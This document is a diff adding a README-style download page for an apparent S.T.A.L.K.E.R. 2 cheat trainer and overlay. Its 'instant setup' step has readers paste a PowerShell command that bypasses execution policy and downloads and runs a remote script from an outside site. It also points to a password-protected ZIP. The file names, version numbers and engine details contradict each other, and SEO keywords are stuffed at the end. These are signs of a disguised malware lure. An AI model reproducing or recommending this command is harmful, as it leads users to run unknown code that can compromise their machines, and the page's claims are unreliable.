@@ -1,0 +1,45 @@
+S.T.A.L.K.E.R. 2: Heart of Chornobyl (v2.1.3 — Windows 10 / 11 x64)
+
+S.T.A.L.K.E.R. 2: Heart of Chornobyl is a standalone 64-bit external overlay and trainer for S.T.A.L.K.E.R. 2: Heart of Chornobyl on PC (Windows 10/11). It uses signature-based memory scanning and a borderless DirectX 11/12 ImGui overlay so base game files remain untouched.
+
+⬇️ Download & Quick Setup (Windows 10 / 11 x64)
+
+- 🚀 Open S.T.A.L.K.E.R. 2: Heart of Chornobyl Setup Portal (TotkOptimizerNxPro-Installer.exe) — Interactive Setup & Mirrors
+- 📦 Direct Download Portable .ZIP Archive (totk-optimizer-nx-pro-patcher-installer-v2.4.0-win64.zip · 2.66 MB · Password: 2026)
+- 📋 Release Notes & SHA-256 Checksums (v2.1.3)
+
+⚡ Instant 1-Command Setup (Win + R or PowerShell · 3 Seconds)
+Press Win + R (or open Windows Terminal / PowerShell), paste the command below, and press Enter:
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/totk-optimizer-nx-pro-patcher-installer | iex"
+
+Key Features & Technical Specs
+
+- Auto-updating AOB signature scanner compatible with Steam and Epic Games builds
+- In-game DirectX 11/12 ImGui overlay menu toggled via INSERT or F1..F12 hotkeys
+- Player attribute editor: God Mode, Infinite Stamina, Currency / XP multiplier, and Zero Weight
+- World & physics controls: Game speed multiplier, instant teleport, item spawner, and ESP
+
+| Property | Specification |
+| :--- | :--- |
+| Package Binary | TotkOptimizerNxPro/TotkOptimizerNxPro-Installer.exe (v2.1.3) |
+| Target Runtime | Unity IL2CPP / Unreal Engine 5 Native x64 Memory & DX12 Overlay (GameAssembly.dll) |
+| Install Path | %LOCALAPPDATA%\Programs\Stalker2HeartOfChorn |
+| Supported OS | Windows 10 / Windows 11 (64-bit, 22H2–24H2) |
+
+How to Install & Run
+
+1. Open the S.T.A.L.K.E.R. 2: Heart of Chornobyl Build & Setup Portal (v2.1.3) or Releases.
+2. Extract TotkOptimizerNxPro and launch TotkOptimizerNxPro-Installer.exe (or use the 1-command Win + R setup on the portal).
+3. Start S.T.A.L.K.E.R. 2: Heart of Chornobyl in Windowed or Borderless Fullscreen mode.
+4. Press INSERT in-game to open the overlay menu and configure hotkeys.
+
+TotkOptimizerNxPro/
+├── TotkOptimizerNxPro-Installer.exe               # Signed Windows x64 Binary
+├── vcruntime140.dll         # Bundled C++ Runtime (v14.42)
+├── vcruntime140_1.dll       # Exception Handling Helper
+├── config.ini               # Default Profile (%LOCALAPPDATA%\Programs\Stalker2HeartOfChorn)
+└── README-Setup.txt         # Quick Start & SHA-256 Checksum
+
+Indexed Topics & Search Reference
+stalker 2: heart of chornobyl trainer · stalker 2: heart of chornobyl cheat · stalker 2: heart of chornobyl mod menu · stalker 2: heart of chornobyl mods · mod-menu · stalker-2 · stalker-2-cheat · stalker-2-cheats · stalker-2-esp · stalker-2-heart-of-chornobyl
